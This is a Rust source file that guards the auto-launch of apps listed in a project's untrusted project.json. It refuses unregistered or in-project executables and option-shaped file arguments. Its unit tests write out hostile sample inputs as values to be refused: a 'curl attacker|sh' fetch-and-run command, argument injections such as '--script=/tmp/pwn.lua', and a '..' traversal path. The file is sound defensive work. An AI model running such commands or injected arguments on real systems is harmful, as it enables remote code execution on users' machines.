use std::collections::HashSet;
use std::path::{Path, PathBuf};

use crate::commands::apps::{do_launch, WindowRegistryState, ORIGIN_RESTORED};
use crate::schema::project::OpenApp;

/// Launch apps from `open_apps` for the given project, skipping already-running
/// ones — and refusing anything the user did not actually register.
///
/// ## Why this is a security gate, not a convenience filter
///
/// `open_apps` lives in the project's own `project.json`, which sits **inside**
/// the project tree: inside the project container's writable rw mount, and inside
/// any repository that gets cloned or imported as a project. This function is the
/// host-side sink that turns an entry into `spawn_reaped` — i.e. an arbitrary
/// process on the **host**, outside any container, with the user's full
/// privileges, on every project activation. So the list is untrusted input and is
/// filtered twice (see [`is_allowed_restore_exec`]):
///
/// 1. anything resolving **inside the project** (or its local mirror) is refused
///    outright — a payload the writer also planted is never a registered app;
/// 2. everything else must match an app the user has actually registered, i.e. an
///    entry of `default_apps.json` / the per-project `default_apps` map / the
///    installed-application scan.
///
/// Nothing in Tabtivity writes `open_apps` any more (see the `commands::apps` module
/// doc — it is legacy best-effort restore metadata), so the filter can be strict:
/// the worst outcome for a legitimate user is that a stale entry is not reopened.
///
/// Returns registry IDs of newly launched windows.
pub fn restore_project_apps(
    registry: &WindowRegistryState,
    open_apps: &[OpenApp],
    project_id: &str,
) -> Vec<String> {
    if open_apps.is_empty() {
        return Vec::new();
    }
    let forbidden = project_roots(project_id);
    let allowed = registered_execs(project_id);
    let mut launched = Vec::new();
    for app in open_apps {
        if app.mode.as_deref() == Some("embedded") {
            continue;
        }
        if !file_is_safe_argument(app.file.as_deref()) {
            eprintln!(
                "restore_service: refusing to auto-launch '{}' from project '{project_id}' \
                 open_apps — its file argument looks like a command-line option",
                app.exec
            );
            continue;
        }
        if !is_allowed_restore_exec(&app.exec, &forbidden, &allowed) {
            eprintln!(
                "restore_service: refusing to auto-launch '{}' from project '{project_id}' \
                 open_apps — it is not a registered app (or resolves inside the project tree)",
                app.exec
            );
            continue;
        }
        {
            let reg = registry.lock().unwrap();
            if reg
                .windows
                .values()
                .any(|w| w.exec == app.exec && w.project_id.as_deref() == Some(project_id))
            {
                continue;
            }
        }
        if let Ok(win) = do_launch(
            registry,
            &app.exec,
            &[],
            app.file.as_deref(),
            Some(project_id),
            None,
            ORIGIN_RESTORED,
        ) {
            launched.push(win.id);
        }
    }
    launched
}

/// Whether an entry's `file` is a file argument rather than a **flag**.
///
/// `do_launch` appends it as a trailing argv item, so the exec filter above is
/// only half the gate: a registered app plus one attacker-chosen option is still
/// an attacker-chosen behaviour (`--script=…`, `--config=…`, `-e …` on the apps
/// that take them), and none of that is what "reopen the file this project had
/// open" means. A real path never starts with `-`; `--` is likewise not a file.
/// Pure, so the rule is testable.
pub fn file_is_safe_argument(file: Option<&str>) -> bool {
    match file.map(str::trim) {
        None | Some("") => true,
        Some(f) => !f.starts_with('-'),
    }
}

/// Whether `exec` may be auto-launched on the host on project activation.
///
/// Pure so the policy is testable without a state dir: `forbidden_roots` are the
/// project's own trees (project dir + local mirror) and `allowed` is the set of
/// match keys derived from the user's registered apps (see [`exec_match_keys`]).
///
/// A candidate is allowed only when *both* hold: it does not resolve inside a
/// forbidden root, and at least one of its match keys is registered.
pub fn is_allowed_restore_exec(
    exec: &str,
    forbidden_roots: &[PathBuf],
    allowed: &HashSet<String>,
) -> bool {
    let exec = exec.trim();
    if exec.is_empty() {
        return false;
    }
    if resolves_inside(exec, forbidden_roots) {
        return false;
    }
    exec_match_keys(exec).iter().any(|k| allowed.contains(k))
}

/// The keys an exec string is matched by, in both directions (candidate and
/// registered app produce their keys the same way, so the sets are comparable):
///
/// - the exec verbatim (trimmed) — the exact spelling a registered entry stores;
/// - the lowercased **basename of its program**, but only when the candidate is a
///   bare command name with no path separator. That is what makes a persisted
///   `firefox` match the `.desktop`-derived `/usr/bin/firefox` the installed-app
///   scan recorded, while `/tmp/firefox` still has to match verbatim — a bare name
///   resolves through `PATH`, an absolute path does not.
///
/// Registered apps always contribute their basename key too (see
/// [`registered_execs`]), so the two rules meet.
fn exec_match_keys(exec: &str) -> Vec<String> {
    let mut keys = vec![exec.to_string()];
    if !exec.contains('/') && !exec.contains('\\') {
        keys.push(exec.to_lowercase());
    }
    keys
}

/// Match keys contributed by one *registered* app's exec string: its verbatim
/// spelling plus the lowercased basename of its program, so a multi-word
/// `Exec=` line (`flatpak run … app.id`) also registers `flatpak`.
fn registered_exec_keys(exec: &str) -> Vec<String> {
    let exec = exec.trim();
    if exec.is_empty() {
        return Vec::new();
    }
    let program = exec.split_whitespace().next().unwrap_or(exec);
    let mut keys = vec![exec.to_string()];
    if let Some(base) = Path::new(program).file_name().and_then(|n| n.to_str()) {
        keys.push(base.to_lowercase());
    }
    keys
}

/// Whether `exec`'s program resolves inside any of `roots`. Canonicalized where
/// possible so a symlink or `..` cannot walk out of the comparison; a bare command
/// name (no separator) resolves through `PATH` and is never "inside the project".
fn resolves_inside(exec: &str, roots: &[PathBuf]) -> bool {
    if roots.is_empty() {
        return false;
    }
    // The program is the whole string when it is a real path (a Windows target or
    // a path with a space), else its first whitespace-separated token — the same
    // split `commands::apps::split_exec_command` applies at launch.
    let program = if Path::new(exec).exists() {
        exec
    } else {
        exec.split_whitespace().next().unwrap_or(exec)
    };
    let p = Path::new(program);
    if !p.is_absolute() && !program.contains('/') && !program.contains('\\') {
        return false;
    }
    let resolved = p.canonicalize().unwrap_or_else(|_| p.to_path_buf());
    roots.iter().any(|root| resolved.starts_with(root))
}

/// The project's own trees: its directory and (for a remote project) its local
/// mirror. Canonicalized so the prefix check in [`resolves_inside`] compares like
/// with like.
fn project_roots(project_id: &str) -> Vec<PathBuf> {
    let mut roots = Vec::new();
    if let Some(dir) = crate::services::sandbox::project_dir_for(project_id) {
        if !dir.is_empty() {
            roots.push(PathBuf::from(dir));
        }
    }
    roots.push(crate::services::remote_sync::mirror_dir(project_id));
    roots
        .iter()
        .map(|r| r.canonicalize().unwrap_or_else(|_| r.clone()))
        .collect()
}

/// Match keys for every app the user has actually registered: the global
/// `default_apps.json` map, this project's own `default_apps` map, and the
/// installed-application scan. Read from the state dir / the OS's own app
/// registry — never from the project tree.
fn registered_execs(project_id: &str) -> HashSet<String> {
    let mut out = HashSet::new();
    let mut add = |exec: &str| out.extend(registered_exec_keys(exec));

    if let Ok(defaults) = crate::commands::default_apps::get_default_apps() {
        for exec in defaults.0.values() {
            add(exec);
        }
    }
    // The per-project map lives in project.json alongside `open_apps`, so it is
    // no more trustworthy than the list being filtered — but it is only ever
    // *consulted*, never auto-launched, and matching against it keeps a legitimate
    // per-project handler restorable. The forbidden-roots check above is what
    // stops it from blessing an in-project payload.
    for exec in crate::commands::apps::project_apps_for_id(Some(project_id)).values() {
        add(exec);
    }
    for app in crate::commands::apps::list_installed_apps() {
        add(&app.exec);
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    fn allowed(execs: &[&str]) -> HashSet<String> {
        execs.iter().flat_map(|e| registered_exec_keys(e)).collect()
    }

    #[test]
    fn registered_exec_contributes_verbatim_and_basename_keys() {
        let keys = registered_exec_keys("/usr/bin/Firefox");
        assert!(keys.contains(&"/usr/bin/Firefox".to_string()));
        assert!(keys.contains(&"firefox".to_string()));
        // A multi-word launcher line registers its program, not the whole tail.
        let keys = registered_exec_keys("flatpak run --branch=stable org.x.App");
        assert!(keys.contains(&"flatpak run --branch=stable org.x.App".to_string()));
        assert!(keys.contains(&"flatpak".to_string()));
        assert!(registered_exec_keys("   ").is_empty());
    }

    #[test]
    fn registered_apps_are_allowed_verbatim_and_by_bare_name() {
        let reg = allowed(&["/usr/bin/firefox", "flatpak run org.x.App"]);
        assert!(is_allowed_restore_exec("/usr/bin/firefox", &[], &reg));
        // A bare name resolves through PATH and matches the registered basename.
        assert!(is_allowed_restore_exec("firefox", &[], &reg));
        assert!(is_allowed_restore_exec("flatpak run org.x.App", &[], &reg));
    }

    #[test]
    fn an_option_shaped_file_argument_is_refused() {
        // The file is appended to a registered app's argv, so a leading `-` is a
        // flag the entry's writer chose, not a document to reopen.
        assert!(file_is_safe_argument(None));
        assert!(file_is_safe_argument(Some("/home/u/notes.md")));
        assert!(file_is_safe_argument(Some("relative/notes.md")));
        assert!(!file_is_safe_argument(Some("--script=/tmp/pwn.lua")));
        assert!(!file_is_safe_argument(Some("-e")));
        assert!(!file_is_safe_argument(Some("  --config=/tmp/x")));
    }

    #[test]
    fn unregistered_exec_is_refused() {
        let reg = allowed(&["/usr/bin/firefox"]);
        assert!(!is_allowed_restore_exec("/tmp/pwn.sh", &[], &reg));
        assert!(!is_allowed_restore_exec("curl attacker|sh", &[], &reg));
        assert!(!is_allowed_restore_exec("", &[], &reg));
        assert!(!is_allowed_restore_exec("   ", &[], &reg));
        // A different absolute path must NOT ride the registered basename.
        assert!(!is_allowed_restore_exec("/tmp/firefox", &[], &reg));
    }

    #[test]
    fn exec_inside_the_project_is_refused_even_if_it_matches_a_registered_app() {
        let base = std::env::temp_dir().join(format!(concat!(crate::app_slug!(), "-restore-{}"), std::process::id()));
        let proj = base.join("proj");
        std::fs::create_dir_all(&proj).unwrap();
        // A payload named exactly like a registered app, living in the project.
        let payload = proj.join("firefox");
        std::fs::write(&payload, b"#!/bin/sh\n").unwrap();
        let payload_s = payload.to_string_lossy().into_owned();

        let roots = vec![proj.canonicalize().unwrap()];
        let reg = allowed(&["/usr/bin/firefox", &payload_s]);
        // Registered (we deliberately poisoned the set) — still refused by path.
        assert!(!is_allowed_restore_exec(&payload_s, &roots, &reg));
        // A payload in a subdirectory is equally refused.
        let sub = proj.join("bin");
        std::fs::create_dir_all(&sub).unwrap();
        let nested = sub.join("pwn.sh");
        std::fs::write(&nested, b"#!/bin/sh\n").unwrap();
        let nested_s = nested.to_string_lossy().into_owned();
        let reg2 = allowed(&[&nested_s]);
        assert!(!is_allowed_restore_exec(&nested_s, &roots, &reg2));
        // Outside the project, still registered → allowed.
        assert!(is_allowed_restore_exec("/usr/bin/firefox", &roots, &reg));

        std::fs::remove_dir_all(&base).ok();
    }

    #[test]
    fn traversal_out_of_the_project_does_not_escape_the_root_check() {
        let base = std::env::temp_dir().join(format!(concat!(crate::app_slug!(), "-restore-t-{}"), std::process::id()));
        let proj = base.join("proj");
        std::fs::create_dir_all(proj.join("sub")).unwrap();
        let payload = proj.join("sub").join("pwn.sh");
        std::fs::write(&payload, b"#!/bin/sh\n").unwrap();
        // Spelled with a `..` detour, which canonicalization resolves away.
        let spelled = format!("{}/sub/../sub/pwn.sh", proj.to_string_lossy());
        let roots = vec![proj.canonicalize().unwrap()];
        let reg = allowed(&[&spelled]);
        assert!(!is_allowed_restore_exec(&spelled, &roots, &reg));
        std::fs::remove_dir_all(&base).ok();
    }
}
